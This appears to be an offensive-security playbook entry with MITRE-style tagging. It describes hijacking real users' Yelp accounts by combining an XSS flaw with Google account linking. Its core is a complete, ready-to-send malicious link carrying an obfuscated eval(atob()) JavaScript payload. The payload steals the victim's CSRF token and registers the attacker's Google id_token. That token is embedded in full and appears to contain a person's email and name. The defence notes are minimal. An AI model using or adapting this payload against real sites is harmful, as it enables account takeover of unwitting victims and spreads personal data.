---
tags:
  - account-takeover
  - xss-ato
type: procedure
tools:
  - '[[tools/Burp]]'
  - '[[tools/CyberChef]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/javascript-ato-payload]]'
  - '[[commands/cyberchef-ato-recipe]]'
  - '[[commands/final-ato-link]]'
platforms:
  - Web
techniques:
  - '[[Valid Accounts]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 646204a3-ff12-4e2f-b2ce-8b440c194b12
created_at: '2025-12-13T23:56:20.372Z'
updated_at: '2025-12-13T23:56:20.372Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Perform Account Takeover via Google Linking XSS

## Summary

This procedure uses XSS to POST an attacker's Google id_token with the victim's CSRF token for account linking.

## Description

Intercept id_token from attacker's Google link, then inject payload to fetch victim's CSRF and register the token.

## Requirements

1. Attacker's Google id_token
2. Tools for encoding and interception
3. Victim interaction

## Defense

Defensive measures and detection strategies:

- CSRF protection on sensitive endpoints
- Validate token origins

## Objectives

1. Intercept id_token
2. Generate and deliver payload
3. Confirm takeover

## Instructions

### Step 1: Intercept id_token

**Context**: Link own Google account.

Use [[tools/Burp]] to capture id_token from /google_connect/register.

> Expected: Valid JWT.

### Step 2: Generate Payload

**Context**: Encode with CyberChef.

Use [[commands/cyberchef-ato-recipe]].

> Expected: Encoded URL.

### Step 3: Deliver Link

**Context**: Victim visits.

Use [[commands/final-ato-link]]:

```bash
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFjeIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

> Expected: Account linked.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques



## Commands Used

- [[commands/javascript-ato-payload]]
- [[commands/cyberchef-ato-recipe]]
- [[commands/final-ato-link]]

## Tools Used

- [[tools/Burp]]
- [[tools/CyberChef]]

## Tags

- account-takeover
- xss-ato
